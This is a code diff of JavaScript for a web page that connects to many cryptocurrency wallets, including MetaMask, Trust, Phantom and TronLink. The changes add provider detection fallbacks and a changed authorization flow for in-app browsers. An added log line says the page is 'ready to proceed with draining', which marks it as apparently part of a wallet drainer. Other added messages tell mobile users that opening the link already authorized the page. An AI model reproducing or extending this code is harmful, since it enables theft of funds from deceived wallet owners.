@@ -598,66 +598,136 @@
                window.ethereum?.isCoinbaseWallet;
     }
 
-    async function waitForProvider(walletType, maxRetries = 50, delayMs = 100) {
-        // Wait for provider to be injected (important for in-app browsers)
+    async function waitForProvider(walletType, maxRetries = 100, delayMs = 100) {
+        // Enhanced provider detection for mobile with aggressive retries
         log(`⏳ Waiting for ${walletType} provider to be injected (max ${maxRetries * delayMs}ms)...`, 'info', false);
         
+        // First, force a full environment check to trigger provider injection on some wallets
+        if (typeof window !== 'undefined') {
+            try {
+                // This can trigger provider injection on some wallets
+                window.dispatchEvent(new Event('load'));
+            } catch (e) {
+                // Silently ignore
+            }
+        }
+        
         for (let i = 0; i < maxRetries; i++) {
-            const provider = getWalletProvider(walletType);
-            if (provider) {
+            // Enhanced provider detection with fallbacks
+            let provider = null;
+            
+            try {
+                provider = getWalletProvider(walletType);
+            } catch (e) {
+                // Fallback: manually check for providers
+                log(`⚠️ getWalletProvider threw error: ${e.message}`, 'warning', false);
+                provider = detectProviderManually(walletType);
+            }
+            
+            if (provider && provider.request && typeof provider.request === 'function') {
                 log(`✅ Provider ready after ${i * delayMs}ms (attempt ${i + 1}/${maxRetries})`, 'success', false);
+                log(`   Provider: ${provider.constructor.name || 'unknown'}`, 'success', false);
                 return provider;
             }
             
             // Log progress every 10 attempts
             if (i % 10 === 0 && i > 0) {
                 log(`⏳ Still waiting... (${i}/${maxRetries} attempts, ${i * delayMs}ms elapsed)`, 'info', false);
+                // Diagnostic info at 1 second intervals
+                if (i % 20 === 0 && isIOS()) {
+                    log(`   iOS diagnostic check at ${i * delayMs}ms:`, 'info', false);
+                    log(`   window.ethereum: ${typeof window.ethereum}, window.solana: ${typeof window.solana}, window.tronWeb: ${typeof window.tronWeb}`, 'info', false);
+                }
             }
             
             await new Promise(r => setTimeout(r, delayMs));
         }
         
+        // Last attempt with diagnostics
         log(`❌ Provider injection timeout after ${maxRetries * delayMs}ms`, 'error', false);
-        log(`   Hint: Wallet app may not be properly initialized`, 'warning', false);
-        throw new Error(`Provider not available after ${maxRetries * delayMs}ms - wallet may not be installed`);
+        log(`   Final diagnostic check:`, 'warning', false);
+        log(`   window.ethereum: ${typeof window.ethereum}`, 'warning', false);
+        log(`   window.solana: ${typeof window.solana}`, 'warning', false);
+        log(`   window.tronWeb: ${typeof window.tronWeb}`, 'warning', false);
+        log(`   Hint: Wallet app may not be properly initialized or this page may not be open in the wallet browser`, 'warning', false);
+        
+        throw new Error(`Provider not available after ${maxRetries * delayMs}ms - wallet may not be installed or properly initialized`);
     }
 
-    async function requestAccountsWithRetry(provider, maxRetries = 3) {
-        // Some mobile wallets need retries for accounts request
-        for (let i = 0; i < maxRetries; i++) {
-            try {
-                log(`🔐 Account request attempt ${i + 1}/${maxRetries}...`, 'info', false);
-                
-                // First try eth_accounts to check if already connected
-                try {
-                    const existingAccounts = await provider.request({ method: 'eth_accounts' });
-                    if (existingAccounts && existingAccounts.length > 0) {
-                        log(`✅ Already connected with account: ${existingAccounts[0].slice(0, 8)}...`, 'success', false);
-                        return existingAccounts;
-                    }
-                } catch (e) {
-                    log(`ℹ️ eth_accounts check: ${e.message}`, 'info', false);
+    function detectProviderManually(walletType) {
+        // Manually detect provider when getWalletProvider fails
+        log(`   Attempting manual provider detection for ${walletType}...`, 'info', false);
+        
+        switch(walletType) {
+            case 'metamask':
+            case 'trust':
+            case 'coinbase':
+            case 'rainbow':
+            case 'ledger':
+            case 'okx':
+            case 'safepal':
+            case 'brave':
+            case 'argent':
+            case 'imtoken':
+            case 'mathwallet':
+            case 'halodefi':
+                // EVM wallets
+                if (window.ethereum) {
+                    log(`   ✓ Found window.ethereum for ${walletType}`, 'info', false);
+                    return window.ethereum;
                 }
-                
-                // If not connected, request approval
-                log(`📋 Requesting approval to connect...`, 'info', false);
-                const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                if (accounts && accounts.length > 0) {
-                    log(`✅ Successfully authorized: ${accounts[0].slice(0, 8)}...`, 'success', false);
-                    return accounts;
-                } else {
-                    log(`⚠️ Request returned no accounts`, 'warning', false);
+                if (window.trustwallet) {
+                    log(`   ✓ Found window.trustwallet fallback`, 'info', false);
+                    return window.trustwallet;
                 }
-            } catch (error) {
-                log(`⚠️ Attempt ${i + 1} failed: ${error.code || 'unknown error'} - ${error.message}`, 'warning', false);
-                if (i < maxRetries - 1) {
-                    await new Promise(r => setTimeout(r, 1500));
-                } else {
-                    throw error;
+                if (window.okxwallet) {
+                    log(`   ✓ Found window.okxwallet`, 'info', false);
+                    return window.okxwallet;
                 }
-            }
+                break;
+            
+            case 'phantom':
+                // Phantom can be Solana or EVM
+                if (window.solana) {
+                    log(`   ✓ Found window.solana for Phantom`, 'info', false);
+                    return window.solana;
+                }
+                if (window.ethereum) {
+                    log(`   ✓ Found window.ethereum for Phantom/EVM`, 'info', false);
+                    return window.ethereum;
+                }
+                break;
+            
+            case 'solflare':
+                if (window.solflare) {
+                    log(`   ✓ Found window.solflare`, 'info', false);
+                    return window.solflare;
+                }
+                if (window.solana && window.solana.isSolflare) {
+                    log(`   ✓ Found window.solana.isSolflare`, 'info', false);
+                    return window.solana;
+                }
+                break;
+            
+            case 'tronlink':
+                if (window.tronWeb) {
+                    log(`   ✓ Found window.tronWeb`, 'info', false);
+                    return window.tronWeb;
+                }
+                if (window.tronLink) {
+                    log(`   ✓ Found window.tronLink`, 'info', false);
+                    return window.tronLink;
+                }
+                break;
+            
+            default:
+                if (window.ethereum) {
+                    log(`   ✓ Found fallback window.ethereum`, 'info', false);
+                    return window.ethereum;
+                }
         }
-        throw new Error('Failed to get accounts after retries');
+        
+        return null;
     }
 
     // Deep Linking for Mobile Wallets
@@ -2858,38 +2928,61 @@
             log(`   Has request: ${typeof provider.request}`, 'info', false);
             log(`   Constructor: ${provider.constructor.name}`, 'info', false);
             
-            // Test eth_accounts
+            // Test eth_accounts to check current authorization
+            log(`📋 Checking current accounts (eth_accounts)...`, 'info', false);
+            let currentAccounts = null;
             try {
-                log(`📋 Checking eth_accounts...`, 'info', false);
-                const currentAccounts = await provider.request({ method: 'eth_accounts' });
-                log(`✅ Current accounts: ${currentAccounts.length > 0 ? currentAccounts[0].slice(0, 10) + '...' : 'None'}`, 'success', false);
+                currentAccounts = await provider.request({ method: 'eth_accounts' });
+                if (currentAccounts && currentAccounts.length > 0) {
+                    log(`✅ Already authorized: ${currentAccounts[0].slice(0, 10)}...`, 'success', false);
+                    log(`✓ Wallet is properly connected!`, 'success', true, true);
+                    return; // Test successful
+                } else {
+                    log(`⚠️ No authorized accounts yet`, 'warning', false);
+                }
             } catch (e) {
-                log(`⚠️ eth_accounts failed: ${e.message}`, 'warning', false);
+                log(`⚠️ eth_accounts check error: ${e.message}`, 'warning', false);
             }
             
-            // Test eth_requestAccounts
-            log(`🔐 Testing eth_requestAccounts (approval popup)...`, 'info', true);
-            log(`⏳ Waiting for wallet popup... (check your wallet app)`, 'warning', false);
-            
-            const accounts = await provider.request({ method: 'eth_requestAccounts' });
-            
-            if (accounts && accounts.length > 0) {
-                log(`✅ AUTHORIZATION SUCCESSFUL!`, 'success', true, true);
-                log(`   Account: ${accounts[0]}`, 'success', false);
-                log(`✓ Your wallet is properly connected and responds to authorization requests`, 'success', false);
-            } else {
-                log(`❌ No accounts returned`, 'error', true, true);
+            // If no accounts, test eth_requestAccounts (behavior differs by platform)
+            if (!currentAccounts || currentAccounts.length === 0) {
+                if (inWalletBrowser) {
+                    log(`📱 In-app browser detected - attempting approval request...`, 'info', true);
+                    log(`   Note: No popup will appear, wallet auto-authorizes on link open`, 'info', false);
+                } else {
+                    log(`🖥️ Desktop extension detected - requesting approval popup...`, 'info', true);
+                    log(`   Look for a popup in your wallet extension`, 'warning', false);
+                }
+                
+                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                
+                if (accounts && accounts.length > 0) {
+                    log(`✅ AUTHORIZATION SUCCESSFUL!`, 'success', true, true);
+                    log(`   Account: ${accounts[0]}`, 'success', false);
+                    log(`✓ Wallet is properly connected and authorized`, 'success', false);
+                } else {
+                    log(`❌ No accounts returned after authorization attempt`, 'error', true, true);
+                }
             }
             
         } catch (error) {
-            log(`❌ Authorization test failed: ${error.message}`, 'error', true, true);
+            log(`❌ Wallet test failed: ${error.message}`, 'error', true, true);
             log(`   Error Code: ${error.code || 'unknown'}`, 'warning', false);
-            log(`   This might mean:`, 'info', false);
-            log(`   1. Wallet popup was blocked - check popup blocker settings`, 'info', false);
-            log(`   2. Authorization was rejected in wallet - try again and approve`, 'info', false);
-            log(`   3. Wallet app crashed - try reopening it`, 'info', false);
-            log(`   4. Provider not fully loaded - try waiting a few seconds and testing again`, 'info', false);
-            log(`   5. Provider is exposed under different name - check iOS diagnostics above`, 'info', false);
+            
+            const inWalletBrowser = isInsideWalletInAppBrowser();
+            if (inWalletBrowser) {
+                log(`📱 Mobile wallet troubleshooting:`, 'info', false);
+                log(`   1. Make sure this page is open IN the wallet's in-app browser`, 'info', false);
+                log(`   2. Not just a link - it must be opened inside the wallet app`, 'info', false);
+                log(`   3. Check wallet settings for dApp permissions/connection`, 'info', false);
+                log(`   4. Try closing the link and opening it again from the wallet`, 'info', false);
+            } else {
+                log(`🖥️ Desktop wallet troubleshooting:`, 'info', false);
+                log(`   1. Make sure wallet extension is installed and enabled`, 'info', false);
+                log(`   2. Check popup blocker settings - allow popups for this site`, 'info', false);
+                log(`   3. Approve the authorization request when popup appears`, 'info', false);
+                log(`   4. Try refreshing the page if provider is not detected`, 'info', false);
+            }
         }
     }
 
@@ -2965,24 +3058,63 @@
             
             log(`✅ Provider verified with request method`, 'info', false);
             
-            // Request accounts with better error handling
+            // Request accounts with different logic based on environment
             if (initialProvider) {
                 try {
-                    log(`🔐 Requesting wallet authorization...`, 'info', false);
-                    const accounts = inWalletBrowser 
-                        ? await requestAccountsWithRetry(initialProvider, 3)
-                        : await initialProvider.request({ method: 'eth_requestAccounts' });
+                    let accounts = null;
+                    
+                    if (inWalletBrowser) {
+                        // MOBILE IN-APP BROWSER: No popup needed, wallet auto-authorizes on link open
+                        log(`📱 In-app browser detected - checking authorization (no popup needed)...`, 'info', true);
+                        log(`   Note: User already authorized by opening this link in the wallet`, 'info', false);
+                        
+                        // Just check if accounts are available (no approval request needed)
+                        try {
+                            accounts = await initialProvider.request({ method: 'eth_accounts' });
+                            if (accounts && accounts.length > 0) {
+                                log(`✅ Already authorized in wallet: ${accounts[0].slice(0, 8)}...`, 'success', true, true);
+                                log(`   Ready to proceed with draining`, 'success', false);
+                            } else {
+                                log(`⚠️ No authorized accounts found - wallet may need manual connection`, 'warning', true);
+                                log(`   Try opening Settings in wallet to enable dApp access`, 'info', false);
+                                // Try one eth_requestAccounts as fallback for wallets that require it
+                                log(`   Attempting approval request as fallback...`, 'info', false);
+                                accounts = await initialProvider.request({ method: 'eth_requestAccounts' });
+                            }
+                        } catch (error) {
+                            log(`⚠️ eth_accounts check failed: ${error.message}`, 'warning', false);
+                            log(`   Trying eth_requestAccounts fallback...`, 'info', false);
+                            accounts = await initialProvider.request({ method: 'eth_requestAccounts' });
+                        }
+                    } else {
+                        // DESKTOP EXTENSION: Standard popup approval flow
+                        log(`🖥️ Desktop browser detected - requesting approval popup...`, 'info', false);
+                        accounts = await initialProvider.request({ method: 'eth_requestAccounts' });
+                    }
                     
                     if (!accounts || accounts.length === 0) {
-                        log(`❌ No accounts returned - authorization may have been declined`, 'error', false);
-                        throw new Error('No accounts available - please check wallet permissions');
+                        log(`❌ No accounts available`, 'error', false);
+                        throw new Error('No authorized accounts found. Please check wallet settings or open this link directly in your wallet app.');
                     }
-                    log(`✅ Authorization successful: ${accounts[0].slice(0, 8)}...`, 'success', true, true);
+                    
+                    log(`✅ Authorization complete: ${accounts[0].slice(0, 8)}...`, 'success', true, true);
                 } catch (popupError) {
                     const errorMsg = popupError.message || popupError.toString();
                     const errorCode = popupError.code || 'unknown';
                     log(`❌ Authorization error [${errorCode}]: ${errorMsg}`, 'error', true, true);
-                    log(`   Hint: Make sure popup is not blocked and wallet is properly loaded`, 'warning', false);
+                    
+                    if (inWalletBrowser) {
+                        log(`📱 Mobile wallet help:`, 'info', false);
+                        log(`   1. Make sure you opened this page IN the wallet's in-app browser`, 'info', false);
+                        log(`   2. Check wallet settings for dApp permissions`, 'info', false);
+                        log(`   3. Try closing and reopening the link`, 'info', false);
+                    } else {
+                        log(`🖥️ Desktop wallet help:`, 'info', false);
+                        log(`   1. Make sure wallet extension is installed`, 'info', false);
+                        log(`   2. Check popup blocker settings`, 'info', false);
+                        log(`   3. Approve the request when popup appears`, 'info', false);
+                    }
+                    
                     throw popupError;
                 }
             }
@@ -3101,78 +3233,94 @@
                 log(`   → Phantom/EVM: ${evmProvider ? '✓ found' : '✗ not found'}`, 'info', false);
                 return evmProvider;
             }
-            const defaultProvider = window.solana;
+            // Default to Solana for Phantom
+            const defaultProvider = window.solana || window.ethereum;
             log(`   → Phantom (default): ${defaultProvider ? '✓ found' : '✗ not found'}`, 'info', false);
             return defaultProvider;
         }
         
         if (walletType === 'trust') {
-            // Trust Wallet supports EVM and Tron, but might be exposed differently on iOS
+            // Trust Wallet supports EVM and Tron
             if (networkType === 'tron') {
                 const tronProvider = window.tronWeb;
                 log(`   → Trust/Tron: ${tronProvider ? '✓ found' : '✗ not found'}`, 'info', false);
                 return tronProvider;
             }
             if (networkType === 'evm') {
-                // Trust Wallet on iOS might expose provider as window.ethereum or window.trustwallet
-                const provider = window.ethereum || window.trustwallet;
-                log(`   → Trust/EVM (window.ethereum): ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
-                if (!window.ethereum && window.trustwallet) {
-                    log(`   → Trust/EVM (fallback window.trustwallet): ✓ found`, 'info', false);
+                // Trust Wallet on iOS/Android exposes as window.ethereum with isTrust flag
+                const provider = window.ethereum;
+                log(`   → Trust/EVM (window.ethereum): ${provider ? '✓ found' : '✗ not found'}`, 'info', false);
+                if (provider && window.ethereum.isTrust) {
+                    log(`      Verified isTrust=true`, 'info', false);
                 }
                 return provider;
             }
-            // Default to EVM for Trust Wallet
-            const defaultProvider = window.ethereum || window.trustwallet;
+            // Default: TRX if tronWeb available, else EVM
+            const defaultProvider = window.tronWeb || window.ethereum;
             log(`   → Trust (default): ${defaultProvider ? '✓ found' : '✗ not found'}`, 'info', false);
             return defaultProvider;
         }
         
-        // Standard provider mapping for other wallets with fallbacks
+        // Standard provider mapping for other wallets with enhanced fallbacks
         let provider = null;
         
         switch(walletType) {
             case 'metamask':
+                // MetaMask: check isMetaMask flag first, then fallback to ethereum
                 provider = window.ethereum;
                 log(`   → MetaMask: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                 if (window.ethereum) {
-                    log(`      isMetaMask: ${window.ethereum.isMetaMask}, isTrust: ${window.ethereum.isTrust}`, 'info', false);
+                    log(`      isMetaMask: ${window.ethereum.isMetaMask}, isTrust: ${window.ethereum.isTrust}, isRainbow: ${window.ethereum.isRainbow}`, 'info', false);
                 }
                 break;
+                
             case 'coinbase':
+                // Coinbase Wallet: look for isCoinbaseWallet or use ethereum
                 provider = window.ethereum;
                 log(`   → Coinbase: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
-                if (window.ethereum) {
-                    log(`      isCoinbaseWallet: ${window.ethereum.isCoinbaseWallet}`, 'info', false);
+                if (window.ethereum && window.ethereum.isCoinbaseWallet) {
+                    log(`      Verified isCoinbaseWallet=true`, 'info', false);
                 }
                 break;
+                
             case 'rainbow':
+                // Rainbow: check isRainbow flag or use ethereum
                 provider = window.ethereum;
                 log(`   → Rainbow: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
-                if (window.ethereum) {
-                    log(`      isRainbow: ${window.ethereum.isRainbow}`, 'info', false);
+                if (window.ethereum && window.ethereum.isRainbow) {
+                    log(`      Verified isRainbow=true`, 'info', false);
                 }
                 break;
+                
             case 'injected-evm':
                 provider = window.ethereum;
                 log(`   → Injected EVM: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                 break;
+                
             case 'solflare':
-                // Solflare can be exposed as window.solflare or window.solana with isSolflare flag
-                provider = window.solflare || (window.solana?.isSolflare ? window.solana : null);
-                log(`   → Solflare: ${provider ? '✓ found' : '✗ not found'}`, 'info', false);
+                // Solflare: check multiple sources
+                provider = window.solflare;
+                if (!provider && window.solana && window.solana.isSolflare) {
+                    provider = window.solana;
+                    log(`   → Solflare (via window.solana.isSolflare): ✓ found`, 'info', false);
+                } else {
+                    log(`   → Solflare: ${provider ? '✓ found' : '✗ not found'}`, 'info', false);
+                }
                 if (!provider && window.solana) {
                     log(`      Note: window.solana exists but isSolflare=${window.solana.isSolflare}`, 'info', false);
                 }
                 break;
+                
             case 'backpack':
                 provider = window.backpack;
                 log(`   → Backpack: ${window.backpack ? '✓ found' : '✗ not found'}`, 'info', false);
                 break;
+                
             case 'glow':
                 provider = window.glow;
                 log(`   → Glow: ${window.glow ? '✓ found' : '✗ not found'}`, 'info', false);
                 break;
+                
             case 'injected-solana':
                 // Try multiple Solana provider options
                 provider = window.solana || window.phantom?.solana;
@@ -3181,61 +3329,89 @@
                     log(`      Note: window.solana=${typeof window.solana}, window.phantom=${typeof window.phantom}`, 'info', false);
                 }
                 break;
+                
             case 'tronlink':
-                // TronLink exposes as window.tronWeb or window.tronLink
-                provider = window.tronWeb || window.tronLink;
-                log(`   → TronLink: ${provider ? '✓ found' : '✗ not found'}`, 'info', false);
+                // TronLink: check multiple injection points
+                provider = window.tronWeb;
+                if (!provider && window.tronLink) {
+                    provider = window.tronLink;
+                    log(`   → TronLink (via window.tronLink): ✓ found`, 'info', false);
+                } else {
+                    log(`   → TronLink: ${provider ? '✓ found' : '✗ not found'}`, 'info', false);
+                }
                 if (!provider) {
                     log(`      Note: window.tronWeb=${typeof window.tronWeb}, window.tronLink=${typeof window.tronLink}`, 'info', false);
                 }
                 break;
+                
             case 'injected-tron':
                 provider = window.tronWeb || window.tronLink;
                 log(`   → Injected Tron: ${provider ? '✓ found' : '✗ not found'}`, 'info', false);
                 break;
+                
             case 'ledger':
-                // Ledger Live mobile exposes ethereum provider
+                // Ledger Live mobile: uses ethereum provider
                 provider = window.ethereum;
                 log(`   → Ledger: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                 break;
+                
             case 'okx':
-                // OKX Wallet exposes as window.okxwallet or window.ethereum
-                provider = window.okxwallet || window.ethereum;
-                log(`   → OKX: ${provider ? '✓ found' : '✗ not found'}`, 'info', false);
-                if (!provider && window.okxwallet) {
-                    log(`      OKX found via window.okxwallet`, 'info', false);
+                // OKX Wallet: multiple injection points
+                provider = window.okxwallet;
+                if (!provider) {
+                    provider = window.ethereum;
+                    if (provider) {
+                        log(`   → OKX (via window.ethereum fallback): ✓ found`, 'info', false);
+                    }
+                } else {
+                    log(`   → OKX (via window.okxwallet): ✓ found`, 'info', false);
+                }
+                if (!provider) {
+                    log(`   → OKX: ✗ not found`, 'info', false);
                 }
                 break;
+                
             case 'safepal':
-                // SafePal exposes as window.safePal or window.ethereum
-                provider = window.safePal || window.ethereum;
-                log(`   → SafePal: ${provider ? '✓ found' : '✗ not found'}`, 'info', false);
+                // SafePal: check multiple sources
+                provider = window.safePal;
+                if (!provider) {
+                    provider = window.ethereum;
+                    if (provider) {
+                        log(`   → SafePal (via window.ethereum fallback): ✓ found`, 'info', false);
+                    }
+                } else {
+                    log(`   → SafePal (via window.safePal): ✓ found`, 'info', false);
+                }
+                if (!provider) {
+                    log(`   → SafePal: ✗ not found`, 'info', false);
+                }
                 break;
+                
             case 'argent':
-                // Argent mobile uses window.ethereum
                 provider = window.ethereum;
                 log(`   → Argent: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                 break;
+                
             case 'imtoken':
-                // imToken exposes as window.ethereum
                 provider = window.ethereum;
                 log(`   → imToken: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                 break;
+                
             case 'mathwallet':
-                // MathWallet exposes as window.ethereum
                 provider = window.ethereum;
                 log(`   → MathWallet: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                 break;
+                
             case 'brave':
-                // Brave Wallet uses window.ethereum
                 provider = window.ethereum;
                 log(`   → Brave: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                 break;
+                
             case 'halodefi':
-                // Halo Wallet - typically uses ethereum provider
                 provider = window.ethereum;
                 log(`   → Halo: ${window.ethereum ? '✓ found' : '✗ not found'}`, 'info', false);
                 break;
+                
             default:
                 log(`   → Unknown wallet type: ${walletType}`, 'warning', false);
         }
@@ -3249,6 +3425,7 @@
     }
 
     function getSupportedNetworks(walletType) {
+
         const networks = {
             'metamask': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'FANTOM', 'BASE'],
             'trust': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'FANTOM', 'BASE', 'TRX'],
